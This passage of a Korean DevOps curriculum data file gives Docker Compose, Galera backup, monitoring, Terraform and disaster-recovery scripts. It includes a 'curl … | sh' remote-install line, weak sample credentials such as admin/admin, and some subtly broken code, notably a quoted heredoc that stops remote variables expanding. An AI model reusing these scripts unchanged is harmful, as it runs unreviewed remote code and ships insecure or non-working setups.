                  code: `# 1. 증분 백업 설정
# XtraBackup으로 증분 백업
docker run --rm --volumes-from galera-node1 \\
  perconalab/percona-xtrabackup \\
  xtrabackup --backup --target-dir=/backup/full

# 6시간마다 증분 백업
docker run --rm --volumes-from galera-node1 \\
  perconalab/percona-xtrabackup \\
  xtrabackup --backup --incremental-basedir=/backup/full \\
  --target-dir=/backup/inc1

# 2. Binary Log 보관
# galera.cnf에 추가
log_bin = /var/log/mysql/mysql-bin.log
expire_logs_days = 7
sync_binlog = 1

# 3. PITR 복구 절차
# 시나리오: 2024-01-15 14:30에 실수로 테이블 삭제

# Step 1: 가장 최근 전체 백업 복원 (14:00 백업)
xtrabackup --prepare --target-dir=/backup/full
xtrabackup --copy-back --target-dir=/backup/full

# Step 2: Binary Log로 14:00 ~ 14:29:59까지 재실행
mysqlbinlog --start-datetime="2024-01-15 14:00:00" \\
            --stop-datetime="2024-01-15 14:29:59" \\
            /var/log/mysql/mysql-bin.* | mysql -u root -p

# 결과: 14:30 직전 상태로 복구!

# 자동화 스크립트
#!/bin/bash
# pitr-restore.sh

RESTORE_TIME="$1"  # 예: "2024-01-15 14:29:59"
BACKUP_DIR="/backup"

# 1. 복원 시점 이전의 가장 최근 백업 찾기
LATEST_BACKUP=$(find \${BACKUP_DIR} -type d -name "full-*" | sort -r | head -1)

# 2. 백업 복원
xtrabackup --prepare --target-dir=\${LATEST_BACKUP}
xtrabackup --copy-back --target-dir=\${LATEST_BACKUP}

# 3. Binary Log로 시점 복구
BACKUP_TIME=$(cat \${LATEST_BACKUP}/xtrabackup_binlog_info | awk '{print $3}')
mysqlbinlog --start-datetime="\${BACKUP_TIME}" \\
            --stop-datetime="\${RESTORE_TIME}" \\
            /var/log/mysql/mysql-bin.* | mysql -u root -p

echo "Restored to \${RESTORE_TIME}"`
                },
                {
                  heading: "6. 멀티 데이터센터 배포",
                  code: `# 지리적으로 분산된 Galera Cluster
# DC1: 서울 (2 nodes)
# DC2: 도쿄 (2 nodes)
# DC3: 싱가포르 (1 node + arbitrator)

# galera.cnf (각 노드)
wsrep_provider_options=" \\
  gmcast.segment=0; \\           # 세그먼트 ID (DC별로 다르게)
  evs.suspect_timeout=PT10S; \\  # 네트워크 지연 허용 10초
  evs.inactive_timeout=PT30S; \\
  evs.install_timeout=PT15S"

# 네트워크 레이턴시 고려
# 서울-도쿄: 30ms
# 서울-싱가포르: 70ms
# 도쿄-싱가포르: 80ms

# 쓰기 흐름:
# 1. 서울 노드에 INSERT
# 2. 모든 노드(도쿄, 싱가포르)에 동기 복제
# 3. 과반수(3/5) 노드 ACK → 커밋 완료
# 평균 쓰기 레이턴시: 70~100ms (WAN 환경)

# 읽기 최적화: GeoDNS로 가까운 DC 연결
# 한국 사용자 → 서울 노드
# 일본 사용자 → 도쿄 노드
# 동남아 사용자 → 싱가포르 노드

# ProxySQL에서 지연 기반 라우팅
INSERT INTO mysql_servers(hostgroup_id, hostname, weight) VALUES
  (1, 'seoul-node1', 100),      # 가중치 높음
  (1, 'tokyo-node1', 50),       # 지연 시간 고려
  (1, 'singapore-node1', 10);   # 지연 시간 가장 큼`
                },
                {
                  heading: "⚡ 고급 실습 과제",
                  checklist: [
                    "Galera Cluster 3노드 구성 후 모든 노드에서 쓰기 테스트",
                    "HAProxy로 로드 밸런싱 설정 및 노드 장애 시 자동 제외 확인",
                    "XtraBackup으로 증분 백업 후 PITR로 특정 시점 복구",
                    "Split-Brain 방지를 위한 Arbitrator 추가 및 쿼럼 테스트",
                    "2개 데이터센터에 Galera 노드 배포 후 지리적 분산 확인"
                  ]
                }
              ]
            }
          }
        },
        {
          id: '4-4',
          name: '인프라 자동화 (IaC)',
          goal: '인프라를 코드로 관리할 수 있다',
          hours: 18,
          keywords: ['Infrastructure as Code', 'Docker Compose', 'disaster recovery'],
          tasks: [],
          content: {
            beginner: {
              title: "초급: Docker Compose로 멀티 컨테이너 환경 구성",
              sections: [
                {
                  subtitle: "1. Docker Compose 기본 구조 이해",
                  content: `Docker Compose는 여러 컨테이너를 YAML 파일 하나로 정의하고 관리하는 도구입니다.

**docker-compose.yml 기본 구조**:
\`\`\`yaml
version: '3.8'

services:
  # 웹 애플리케이션
  web:
    image: node:20-alpine
    ports:
      - "3000:3000"
    environment:
      - NODE_ENV=production
      - DB_HOST=db
    volumes:
      - ./app:/app
      - /app/node_modules
    depends_on:
      - db
      - redis
    networks:
      - app-network
    restart: unless-stopped

  # MySQL 데이터베이스
  db:
    image: mysql:8.0
    environment:
      - MYSQL_ROOT_PASSWORD=\${DB_PASSWORD}
      - MYSQL_DATABASE=myapp
    volumes:
      - mysql-data:/var/lib/mysql
      - ./init.sql:/docker-entrypoint-initdb.d/init.sql
    networks:
      - app-network
    restart: unless-stopped

  # Redis 캐시
  redis:
    image: redis:7-alpine
    volumes:
      - redis-data:/data
    networks:
      - app-network
    restart: unless-stopped

volumes:
  mysql-data:
  redis-data:

networks:
  app-network:
    driver: bridge
\`\`\`

**주요 개념**:
- **services**: 실행할 컨테이너들 정의
- **volumes**: 데이터 영속성 보장
- **networks**: 컨테이너 간 통신 네트워크
- **depends_on**: 시작 순서 제어
- **restart**: 재시작 정책`,
                  checklist: [
                    "docker-compose.yml 파일 생성하고 웹/DB/캐시 서비스 정의",
                    "환경 변수를 .env 파일로 분리 (DB_PASSWORD 등)",
                    "docker-compose up -d로 전체 스택 실행",
                    "docker-compose ps로 모든 서비스 상태 확인",
                    "docker-compose logs -f web으로 로그 실시간 모니터링"
                  ]
                },
                {
                  subtitle: "2. 환경별 설정 분리 (dev/staging/prod)",
                  content: `환경별로 다른 설정을 사용하기 위해 Compose Override 기능을 활용합니다.

**베이스 설정 (docker-compose.yml)**:
\`\`\`yaml
version: '3.8'

services:
  web:
    image: myapp:latest
    environment:
      - NODE_ENV=production
    # 공통 설정들...
\`\`\`

**개발 환경 오버라이드 (docker-compose.dev.yml)**:
\`\`\`yaml
version: '3.8'

services:
  web:
    build:
      context: .
      dockerfile: Dockerfile.dev
    environment:
      - NODE_ENV=development
      - DEBUG=*
    volumes:
      - .:/app  # 소스 코드 실시간 반영
    ports:
      - "3000:3000"
      - "9229:9229"  # Node.js 디버거 포트
    command: npm run dev

  db:
    ports:
      - "3306:3306"  # 로컬 DB 클라이언트 접근
\`\`\`

**프로덕션 환경 오버라이드 (docker-compose.prod.yml)**:
\`\`\`yaml
version: '3.8'

services:
  web:
    deploy:
      replicas: 3
      resources:
        limits:
          cpus: '2'
          memory: 2G
        reservations:
          cpus: '1'
          memory: 1G
    logging:
      driver: "json-file"
      options:
        max-size: "10m"
        max-file: "3"

  db:
    # 포트 외부 노출 안 함 (보안)
    # ports 섹션 없음
\`\`\`

**환경별 실행**:
\`\`\`bash
# 개발 환경
docker-compose -f docker-compose.yml -f docker-compose.dev.yml up

# 프로덕션 환경
docker-compose -f docker-compose.yml -f docker-compose.prod.yml up -d

# .env 파일로 환경 변수 주입
echo "DB_PASSWORD=secret123" > .env
docker-compose --env-file .env up
\`\`\``,
                  checklist: [
                    "docker-compose.dev.yml 생성하고 볼륨 마운트로 핫 리로드 설정",
                    "docker-compose.prod.yml 생성하고 리소스 제한 설정",
                    "각 환경별로 실행해서 설정 차이 확인",
                    ".env.example 파일 생성하고 필요한 환경 변수 문서화",
                    "docker-compose config로 최종 병합된 설정 확인"
                  ]
                },
                {
                  subtitle: "3. Health Check와 의존성 관리",
                  content: `컨테이너가 실제로 준비되었는지 확인하는 Health Check를 설정합니다.

**Health Check 설정**:
\`\`\`yaml
version: '3.8'

services:
  web:
    image: myapp:latest
    healthcheck:
      test: ["CMD", "curl", "-f", "http://localhost:3000/health"]
      interval: 30s
      timeout: 10s
      retries: 3
      start_period: 40s
    depends_on:
      db:
        condition: service_healthy
      redis:
        condition: service_healthy

  db:
    image: mysql:8.0
    healthcheck:
      test: ["CMD", "mysqladmin", "ping", "-h", "localhost"]
      interval: 10s
      timeout: 5s
      retries: 5

  redis:
    image: redis:7-alpine
    healthcheck:
      test: ["CMD", "redis-cli", "ping"]
      interval: 5s
      timeout: 3s
      retries: 5
\`\`\`

**Wait-for-it 스크립트 사용** (더 정교한 대기):
\`\`\`yaml
services:
  web:
    image: myapp:latest
    command: >
      sh -c "
        ./wait-for-it.sh db:3306 -t 60 &&
        ./wait-for-it.sh redis:6379 -t 60 &&
        npm start
      "
    volumes:
      - ./wait-for-it.sh:/app/wait-for-it.sh
\`\`\`

**wait-for-it.sh**:
\`\`\`bash
#!/bin/bash
# https://github.com/vishnubob/wait-for-it

TIMEOUT=15
QUIET=0

while [[ $# -gt 0 ]]; do
  case "$1" in
    -t|--timeout)
      TIMEOUT="$2"
      shift 2
      ;;
    *)
      HOST=$(echo $1 | cut -d: -f1)
      PORT=$(echo $1 | cut -d: -f2)
      shift
      ;;
  esac
done

echo "Waiting for $HOST:$PORT..."

for i in \`seq $TIMEOUT\`; do
  nc -z $HOST $PORT && echo "Service is up!" && exit 0
  sleep 1
done

echo "Timeout waiting for $HOST:$PORT"
exit 1
\`\`\``,
                  checklist: [
                    "모든 서비스에 healthcheck 설정 추가",
                    "docker-compose up 실행 후 서비스 시작 순서 확인",
                    "docker inspect로 health 상태 확인",
                    "DB 컨테이너를 일부러 중단시켜 재시작 동작 테스트",
                    "wait-for-it.sh 스크립트 다운로드 후 권한 설정 (chmod +x)"
                  ]
                }
              ]
            },
            intermediate: {
              title: "중급: 인프라 백업/복구 자동화와 모니터링 통합",
              sections: [
                {
                  subtitle: "1. 전체 인프라 백업/복구 자동화",
                  content: `Docker 볼륨, 설정, 데이터베이스를 모두 백업하는 자동화 시스템을 구축합니다.

**backup-compose.yml** (백업 전용 스택):
\`\`\`yaml
version: '3.8'

services:
  # 정기 백업 서비스
  backup:
    image: alpine:latest
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock:ro
      - mysql-data:/backup/mysql:ro
      - redis-data:/backup/redis:ro
      - ./backups:/backups
      - ./backup.sh:/backup.sh
    environment:
      - AWS_ACCESS_KEY_ID=\${AWS_ACCESS_KEY_ID}
      - AWS_SECRET_ACCESS_KEY=\${AWS_SECRET_ACCESS_KEY}
      - S3_BUCKET=my-infra-backups
    command: >
      sh -c "
        apk add --no-cache docker-cli aws-cli &&
        crond -f
      "
    restart: unless-stopped

volumes:
  mysql-data:
    external: true
  redis-data:
    external: true
\`\`\`

**backup.sh** (전체 백업 스크립트):
\`\`\`bash
#!/bin/bash
set -e

DATE=\$(date +%Y%m%d_%H%M%S)
BACKUP_DIR="/backups/\${DATE}"
mkdir -p \${BACKUP_DIR}

echo "🔄 Starting full infrastructure backup..."

# 1. Docker Compose 설정 백업
echo "📄 Backing up Docker Compose configs..."
cp /app/docker-compose.yml \${BACKUP_DIR}/
cp /app/.env \${BACKUP_DIR}/

# 2. MySQL 백업 (컨테이너 내부에서 실행)
echo "💾 Backing up MySQL..."
docker exec mysql mysqldump -u root -p\${MYSQL_ROOT_PASSWORD} \\
  --all-databases --single-transaction --quick \\
  | gzip > \${BACKUP_DIR}/mysql_\${DATE}.sql.gz

# 3. Redis 백업 (RDB 파일 복사)
echo "📦 Backing up Redis..."
docker exec redis redis-cli BGSAVE
sleep 5  # RDB 저장 대기
docker cp redis:/data/dump.rdb \${BACKUP_DIR}/redis_\${DATE}.rdb

# 4. Docker 볼륨 직접 백업
echo "📂 Backing up Docker volumes..."
tar czf \${BACKUP_DIR}/volumes_\${DATE}.tar.gz -C /backup mysql redis

# 5. 전체 백업을 하나로 압축
echo "🗜️  Compressing full backup..."
tar czf /backups/full_backup_\${DATE}.tar.gz -C /backups \${DATE}

# 6. S3 업로드
echo "☁️  Uploading to S3..."
aws s3 cp /backups/full_backup_\${DATE}.tar.gz \\
  s3://\${S3_BUCKET}/infra/\${DATE}/ \\
  --storage-class STANDARD_IA

# 7. 로컬 백업 정리 (7일 이상 된 것 삭제)
find /backups -name "full_backup_*.tar.gz" -mtime +7 -delete

echo "✅ Backup completed: \${DATE}"

# Slack 알림
curl -X POST \${SLACK_WEBHOOK_URL} \\
  -H 'Content-Type: application/json' \\
  -d "{\"text\":\"✅ Infrastructure backup completed: \${DATE}\"}"
\`\`\`

**Cron 설정** (매일 새벽 3시):
\`\`\`bash
# backup 컨테이너 내부의 /etc/crontabs/root
0 3 * * * /backup.sh >> /var/log/backup.log 2>&1
\`\`\`

**복구 스크립트 (restore.sh)**:
\`\`\`bash
#!/bin/bash
set -e

BACKUP_FILE=$1

if [ -z "\$BACKUP_FILE" ]; then
  echo "Usage: ./restore.sh <backup_file.tar.gz>"
  exit 1
fi

echo "⚠️  WARNING: This will restore infrastructure from backup!"
read -p "Continue? (yes/no): " confirm

if [ "\$confirm" != "yes" ]; then
  exit 0
fi

# 1. 기존 스택 중단
echo "🛑 Stopping current stack..."
docker-compose down

# 2. 백업 압축 해제
echo "📦 Extracting backup..."
tar xzf \$BACKUP_FILE -C /tmp/

BACKUP_DIR=\$(tar tzf \$BACKUP_FILE | head -1 | cut -f1 -d"/")

# 3. 설정 파일 복원
echo "📄 Restoring configs..."
cp /tmp/\${BACKUP_DIR}/docker-compose.yml ./
cp /tmp/\${BACKUP_DIR}/.env ./

# 4. MySQL 복원
echo "💾 Restoring MySQL..."
docker-compose up -d db
sleep 10
gunzip < /tmp/\${BACKUP_DIR}/mysql_*.sql.gz | \\
  docker exec -i mysql mysql -u root -p\${MYSQL_ROOT_PASSWORD}

# 5. Redis 복원
echo "📦 Restoring Redis..."
docker cp /tmp/\${BACKUP_DIR}/redis_*.rdb redis:/data/dump.rdb
docker-compose restart redis

# 6. 전체 스택 재시작
echo "🚀 Starting full stack..."
docker-compose up -d

echo "✅ Restore completed!"
\`\`\``,
                  checklist: [
                    "backup-compose.yml 생성하고 백업 서비스 실행",
                    "backup.sh 스크립트 작성 후 수동 실행으로 테스트",
                    "S3 버킷 생성 및 AWS 자격 증명 설정",
                    "Cron으로 매일 자동 백업 설정",
                    "restore.sh로 백업 파일 하나 선택해서 복구 테스트"
                  ]
                },
                {
                  subtitle: "2. Prometheus + Grafana 모니터링 통합",
                  content: `Docker Compose에 모니터링 스택을 통합하여 인프라 전체를 모니터링합니다.

**monitoring-compose.yml**:
\`\`\`yaml
version: '3.8'

services:
  # Prometheus (메트릭 수집)
  prometheus:
    image: prom/prometheus:latest
    volumes:
      - ./prometheus.yml:/etc/prometheus/prometheus.yml
      - prometheus-data:/prometheus
    command:
      - '--config.file=/etc/prometheus/prometheus.yml'
      - '--storage.tsdb.retention.time=30d'
    ports:
      - "9090:9090"
    networks:
      - monitoring

  # Grafana (시각화)
  grafana:
    image: grafana/grafana:latest
    volumes:
      - grafana-data:/var/lib/grafana
      - ./grafana/provisioning:/etc/grafana/provisioning
    environment:
      - GF_SECURITY_ADMIN_PASSWORD=admin
      - GF_USERS_ALLOW_SIGN_UP=false
    ports:
      - "3001:3000"
    networks:
      - monitoring
    depends_on:
      - prometheus

  # Node Exporter (호스트 메트릭)
  node-exporter:
    image: prom/node-exporter:latest
    volumes:
      - /proc:/host/proc:ro
      - /sys:/host/sys:ro
      - /:/rootfs:ro
    command:
      - '--path.procfs=/host/proc'
      - '--path.sysfs=/host/sys'
      - '--collector.filesystem.mount-points-exclude=^/(sys|proc|dev|host|etc)(\$\$|/)'
    ports:
      - "9100:9100"
    networks:
      - monitoring

  # cAdvisor (컨테이너 메트릭)
  cadvisor:
    image: gcr.io/cadvisor/cadvisor:latest
    volumes:
      - /:/rootfs:ro
      - /var/run:/var/run:ro
      - /sys:/sys:ro
      - /var/lib/docker/:/var/lib/docker:ro
    ports:
      - "8080:8080"
    networks:
      - monitoring

  # MySQL Exporter (DB 메트릭)
  mysql-exporter:
    image: prom/mysqld-exporter:latest
    environment:
      - DATA_SOURCE_NAME=exporter:password@(db:3306)/
    ports:
      - "9104:9104"
    networks:
      - monitoring
      - app-network

  # Redis Exporter (캐시 메트릭)
  redis-exporter:
    image: oliver006/redis_exporter:latest
    environment:
      - REDIS_ADDR=redis:6379
    ports:
      - "9121:9121"
    networks:
      - monitoring
      - app-network

volumes:
  prometheus-data:
  grafana-data:

networks:
  monitoring:
    driver: bridge
  app-network:
    external: true
\`\`\`

**prometheus.yml** (Prometheus 설정):
\`\`\`yaml
global:
  scrape_interval: 15s
  evaluation_interval: 15s

scrape_configs:
  # Prometheus 자체 모니터링
  - job_name: 'prometheus'
    static_configs:
      - targets: ['localhost:9090']

  # 호스트 메트릭
  - job_name: 'node-exporter'
    static_configs:
      - targets: ['node-exporter:9100']

  # 컨테이너 메트릭
  - job_name: 'cadvisor'
    static_configs:
      - targets: ['cadvisor:8080']

  # MySQL 메트릭
  - job_name: 'mysql'
    static_configs:
      - targets: ['mysql-exporter:9104']

  # Redis 메트릭
  - job_name: 'redis'
    static_configs:
      - targets: ['redis-exporter:9121']

  # 애플리케이션 메트릭 (Node.js prom-client)
  - job_name: 'app'
    static_configs:
      - targets: ['web:3000']
    metrics_path: '/metrics'
\`\`\`

**전체 스택 실행**:
\`\`\`bash
# 앱 + 모니터링 동시 실행
docker-compose -f docker-compose.yml -f monitoring-compose.yml up -d

# Grafana 접속: http://localhost:3001
# 기본 로그인: admin / admin

# Prometheus 쿼리 예시
# - 컨테이너 CPU: container_cpu_usage_seconds_total
# - MySQL 쿼리 수: mysql_global_status_queries
# - Redis 메모리: redis_memory_used_bytes
\`\`\``,
                  checklist: [
                    "monitoring-compose.yml 생성하고 모니터링 스택 실행",
                    "Prometheus UI(9090)에서 모든 타겟이 UP 상태인지 확인",
                    "Grafana(3001)에서 Prometheus 데이터소스 추가",
                    "Grafana에서 Docker Dashboard 임포트 (ID: 179, 193)",
                    "앱에 부하를 주고 CPU/메모리 메트릭 실시간 확인"
                  ]
                },
                {
                  subtitle: "3. 로그 중앙화 (Loki + Promtail)",
                  content: `모든 컨테이너 로그를 Loki에 수집하고 Grafana에서 통합 조회합니다.

**logging-compose.yml**:
\`\`\`yaml
version: '3.8'

services:
  # Loki (로그 저장소)
  loki:
    image: grafana/loki:latest
    ports:
      - "3100:3100"
    volumes:
      - ./loki-config.yml:/etc/loki/local-config.yaml
      - loki-data:/loki
    command: -config.file=/etc/loki/local-config.yaml
    networks:
      - monitoring

  # Promtail (로그 수집 에이전트)
  promtail:
    image: grafana/promtail:latest
    volumes:
      - /var/log:/var/log:ro
      - /var/lib/docker/containers:/var/lib/docker/containers:ro
      - ./promtail-config.yml:/etc/promtail/config.yml
    command: -config.file=/etc/promtail/config.yml
    networks:
      - monitoring

volumes:
  loki-data:

networks:
  monitoring:
    external: true
\`\`\`

**loki-config.yml**:
\`\`\`yaml
auth_enabled: false

server:
  http_listen_port: 3100

ingester:
  lifecycler:
    ring:
      kvstore:
        store: inmemory
      replication_factor: 1

schema_config:
  configs:
    - from: 2024-01-01
      store: boltdb-shipper
      object_store: filesystem
      schema: v11
      index:
        prefix: index_
        period: 24h

storage_config:
  boltdb_shipper:
    active_index_directory: /loki/index
    cache_location: /loki/cache
  filesystem:
    directory: /loki/chunks

limits_config:
  retention_period: 168h  # 7일 보관
\`\`\`

**promtail-config.yml**:
\`\`\`yaml
server:
  http_listen_port: 9080

positions:
  filename: /tmp/positions.yaml

clients:
  - url: http://loki:3100/loki/api/v1/push

scrape_configs:
  # Docker 컨테이너 로그 수집
  - job_name: docker
    static_configs:
      - targets:
          - localhost
        labels:
          job: docker
          __path__: /var/lib/docker/containers/*/*.log
    pipeline_stages:
      - json:
          expressions:
            output: log
            stream: stream
            container_name: attrs.name
      - labels:
          container_name:
          stream:
      - output:
          source: output
\`\`\`

**Grafana에서 Loki 연동**:
\`\`\`bash
# Grafana Data Source 추가
# URL: http://loki:3100

# LogQL 쿼리 예시
{container_name="web"} |= "ERROR"
{container_name="db"} |= "slow query"
{job="docker"} | json | line_format "{{.container_name}}: {{.log}}"
\`\`\``,
                  checklist: [
                    "logging-compose.yml 생성하고 Loki + Promtail 실행",
                    "Grafana에서 Loki 데이터소스 추가 (http://loki:3100)",
                    "Explore 탭에서 {container_name=\"web\"} 쿼리로 로그 확인",
                    "에러 로그만 필터링하는 쿼리 작성 (|= \"ERROR\")",
                    "로그 + 메트릭 통합 대시보드 생성 (CPU 높을 때 로그 연동)"
                  ]
                }
              ]
            },
            advanced: {
              title: "고급: Terraform으로 인프라 코드화 및 재해 복구",
              sections: [
                {
                  subtitle: "1. Terraform으로 CapRover 인프라 관리",
                  content: `Terraform을 사용해 CapRover 서버와 Docker 리소스를 코드로 관리합니다.

**프로젝트 구조**:
\`\`\`
terraform/
├── main.tf              # 메인 설정
├── variables.tf         # 변수 정의
├── outputs.tf          # 출력값
├── provider.tf         # 프로바이더 설정
├── modules/
│   ├── caprover/       # CapRover 모듈
│   ├── docker/         # Docker 리소스 모듈
│   └── monitoring/     # 모니터링 스택 모듈
└── environments/
    ├── dev.tfvars
    ├── staging.tfvars
    └── prod.tfvars
\`\`\`

**provider.tf** (Docker Provider 사용):
\`\`\`hcl
terraform {
  required_providers {
    docker = {
      source  = "kreuzwerker/docker"
      version = "~> 3.0"
    }
  }

  # 상태 저장소 (S3 백엔드)
  backend "s3" {
    bucket = "my-terraform-state"
    key    = "caprover/terraform.tfstate"
    region = "ap-northeast-2"
  }
}

provider "docker" {
  host = "unix:///var/run/docker.sock"
}
\`\`\`

**main.tf** (Docker 네트워크 및 볼륨):
\`\`\`hcl
# Docker 네트워크
resource "docker_network" "app_network" {
  name   = "app-network"
  driver = "bridge"
}

# MySQL 볼륨
resource "docker_volume" "mysql_data" {
  name = "mysql-data"
}

# Redis 볼륨
resource "docker_volume" "redis_data" {
  name = "redis-data"
}

# MySQL 컨테이너
resource "docker_container" "mysql" {
  name  = "mysql"
  image = docker_image.mysql.image_id

  env = [
    "MYSQL_ROOT_PASSWORD=\${var.mysql_root_password}",
    "MYSQL_DATABASE=\${var.mysql_database}"
  ]

  volumes {
    volume_name    = docker_volume.mysql_data.name
    container_path = "/var/lib/mysql"
  }

  networks_advanced {
    name = docker_network.app_network.name
  }

  restart = "unless-stopped"

  healthcheck {
    test     = ["CMD", "mysqladmin", "ping", "-h", "localhost"]
    interval = "10s"
    timeout  = "5s"
    retries  = 5
  }
}

# Redis 컨테이너
resource "docker_container" "redis" {
  name  = "redis"
  image = docker_image.redis.image_id

  volumes {
    volume_name    = docker_volume.redis_data.name
    container_path = "/data"
  }

  networks_advanced {
    name = docker_network.app_network.name
  }

  restart = "unless-stopped"
}

# 웹 애플리케이션 컨테이너
resource "docker_container" "web" {
  name  = "web"
  image = docker_image.app.image_id

  env = [
    "NODE_ENV=\${var.environment}",
    "DB_HOST=mysql",
    "REDIS_HOST=redis"
  ]

  ports {
    internal = 3000
    external = var.app_port
  }

  networks_advanced {
    name = docker_network.app_network.name
  }

  depends_on = [
    docker_container.mysql,
    docker_container.redis
  ]

  restart = "unless-stopped"
}

# Docker 이미지
resource "docker_image" "mysql" {
  name = "mysql:8.0"
}

resource "docker_image" "redis" {
  name = "redis:7-alpine"
}

resource "docker_image" "app" {
  name = "\${var.app_image}:\${var.app_version}"
}
\`\`\`

**variables.tf**:
\`\`\`hcl
variable "environment" {
  description = "Environment name"
  type        = string
  default     = "production"
}

variable "mysql_root_password" {
  description = "MySQL root password"
  type        = string
  sensitive   = true
}

variable "mysql_database" {
  description = "MySQL database name"
  type        = string
  default     = "myapp"
}

variable "app_image" {
  description = "Application Docker image"
  type        = string
}

variable "app_version" {
  description = "Application version tag"
  type        = string
  default     = "latest"
}

variable "app_port" {
  description = "Application external port"
  type        = number
  default     = 3000
}
\`\`\`

**environments/prod.tfvars**:
\`\`\`hcl
environment   = "production"
app_image     = "myregistry/myapp"
app_version   = "v1.2.3"
app_port      = 80
mysql_database = "myapp_prod"
\`\`\`

**Terraform 실행**:
\`\`\`bash
# 초기화
terraform init

# 계획 확인
terraform plan -var-file=environments/prod.tfvars

# 적용
terraform apply -var-file=environments/prod.tfvars

# 특정 리소스만 재생성
terraform taint docker_container.web
terraform apply

# 전체 인프라 제거
terraform destroy -var-file=environments/prod.tfvars
\`\`\``,
                  checklist: [
                    "Terraform 설치 및 provider.tf 작성",
                    "main.tf에 Docker 네트워크/볼륨/컨테이너 정의",
                    "terraform plan으로 변경 사항 미리보기",
                    "terraform apply로 인프라 프로비저닝",
                    "웹 컨테이너 설정 변경 후 terraform apply로 무중단 업데이트"
                  ]
                },
                {
                  subtitle: "2. 재해 복구 계획 (Disaster Recovery)",
                  content: `전체 인프라를 다른 리전/서버에 빠르게 복구하는 자동화 시스템을 구축합니다.

**DR(재해 복구) 전략 - RTO/RPO 정의**:
- **RTO (Recovery Time Objective)**: 목표 복구 시간 - 30분
- **RPO (Recovery Point Objective)**: 목표 복구 시점 - 15분

**dr-plan.sh** (재해 복구 자동화):
\`\`\`bash
#!/bin/bash
set -e

DR_REGION="us-west-2"  # Primary: ap-northeast-2
DR_SERVER="dr-server.example.com"
BACKUP_BUCKET="s3://my-dr-backups"

echo "🚨 Starting Disaster Recovery Process..."

# 1. 최신 백업 확인
echo "📦 Finding latest backup..."
LATEST_BACKUP=\$(aws s3 ls \${BACKUP_BUCKET}/infra/ | sort | tail -n 1 | awk '{print $4}')

if [ -z "\$LATEST_BACKUP" ]; then
  echo "❌ No backup found!"
  exit 1
fi

echo "✅ Latest backup: \$LATEST_BACKUP"

# 2. DR 서버에 SSH 접속하여 복구 시작
echo "🔗 Connecting to DR server..."
ssh ubuntu@\${DR_SERVER} << 'EOF'
  # Docker 설치 확인
  if ! command -v docker &> /dev/null; then
    echo "Installing Docker..."
    curl -fsSL https://get.docker.com | sh
    sudo usermod -aG docker ubuntu
  fi

  # Terraform 설치 확인
  if ! command -v terraform &> /dev/null; then
    echo "Installing Terraform..."
    wget https://releases.hashicorp.com/terraform/1.6.0/terraform_1.6.0_linux_amd64.zip
    unzip terraform_1.6.0_linux_amd64.zip
    sudo mv terraform /usr/local/bin/
  fi

  # 백업 다운로드
  aws s3 cp \${BACKUP_BUCKET}/infra/\${LATEST_BACKUP} ./backup.tar.gz

  # 백업 압축 해제
  tar xzf backup.tar.gz

  # Terraform 상태 복구
  cd terraform
  terraform init -backend-config="bucket=my-dr-terraform-state"
  terraform apply -auto-approve -var-file=environments/dr.tfvars

  # Docker Compose로 서비스 시작
  docker-compose -f docker-compose.yml up -d

  # 데이터베이스 복구
  gunzip < backup/mysql_*.sql.gz | docker exec -i mysql mysql -u root -p\${MYSQL_ROOT_PASSWORD}

  # Health Check
  echo "🏥 Running health checks..."
  sleep 30
  curl -f http://localhost/health || exit 1

  echo "✅ DR recovery completed!"
EOF

# 3. DNS 업데이트 (Route53)
echo "🌐 Updating DNS to DR server..."
aws route53 change-resource-record-sets \\
  --hosted-zone-id Z1234567890ABC \\
  --change-batch '{
    "Changes": [{
      "Action": "UPSERT",
      "ResourceRecordSet": {
        "Name": "app.example.com",
        "Type": "A",
        "TTL": 60,
        "ResourceRecords": [{"Value": "'$(dig +short ${DR_SERVER})'"}]
      }
    }]
  }'

# 4. Slack 알림
curl -X POST \${SLACK_WEBHOOK_URL} \\
  -H 'Content-Type: application/json' \\
  -d '{
    "text": "🚨 Disaster Recovery activated! Services running on DR server.",
    "attachments": [{
      "color": "warning",
      "fields": [
        {"title": "Backup Used", "value": "'\${LATEST_BACKUP}'", "short": true},
        {"title": "DR Server", "value": "'\${DR_SERVER}'", "short": true}
      ]
    }]
  }'

echo "✅ Disaster Recovery completed successfully!"
echo "🌐 Services now running on: \${DR_SERVER}"
\`\`\`

**DR 테스트 자동화** (매월 실행):
\`\`\`bash
#!/bin/bash
# dr-test.sh - 재해 복구 훈련

echo "🧪 Starting DR Test (non-destructive)..."

# 1. 테스트용 DR 서버 프로비저닝 (Terraform)
cd terraform
terraform workspace new dr-test
terraform apply -auto-approve -var-file=environments/dr-test.tfvars

# 2. 최신 백업으로 복구 테스트
./dr-plan.sh --test-mode

# 3. 성능 테스트 (k6)
k6 run --vus 100 --duration 5m load-test.js

# 4. 결과 리포트 생성
cat > dr-test-report.md << EOF
# DR Test Report - \$(date +%Y-%m-%d)

## Summary
- **RTO Achieved**: \${RTO_MINUTES} minutes
- **RPO Achieved**: \${RPO_MINUTES} minutes
- **Performance**: \${PERFORMANCE_SCORE}/100

## Services Status
- Web: ✅ Healthy
- Database: ✅ Healthy
- Cache: ✅ Healthy

## Recommendations
- Update DNS TTL to 60 seconds for faster failover
- Increase backup frequency to every 10 minutes
EOF

# 5. 테스트 환경 정리
terraform workspace select default
terraform destroy -auto-approve

echo "✅ DR Test completed. Report: dr-test-report.md"
\`\`\`

**자동 페일오버 (Health Check 기반)**:
\`\`\`bash
#!/bin/bash
# auto-failover.sh - Cron으로 매분 실행

PRIMARY_URL="https://app.example.com/health"
DR_TRIGGER_THRESHOLD=3  # 3번 연속 실패 시 DR 발동

FAIL_COUNT=\$(cat /tmp/fail_count 2>/dev/null || echo 0)

if ! curl -sf \${PRIMARY_URL} > /dev/null; then
  FAIL_COUNT=$((FAIL_COUNT + 1))
  echo \${FAIL_COUNT} > /tmp/fail_count

  if [ \${FAIL_COUNT} -ge \${DR_TRIGGER_THRESHOLD} ]; then
    echo "🚨 PRIMARY DOWN! Triggering DR..."
    ./dr-plan.sh
    echo 0 > /tmp/fail_count
  fi
else
  echo 0 > /tmp/fail_count
fi
\`\`\``,
                  checklist: [
                    "dr-plan.sh 스크립트 작성하고 DR 서버 정보 설정",
                    "AWS Route53에 도메인 등록 및 DNS 업데이트 테스트",
                    "dr-test.sh로 월간 DR 훈련 실행 (RTO/RPO 측정)",
                    "auto-failover.sh를 Cron에 등록 (* * * * *)",
                    "Primary 서버를 일부러 중단시켜 자동 페일오버 동작 확인"
                  ]
                },
                {
                  subtitle: "3. Multi-Region 인프라 자동 복제",
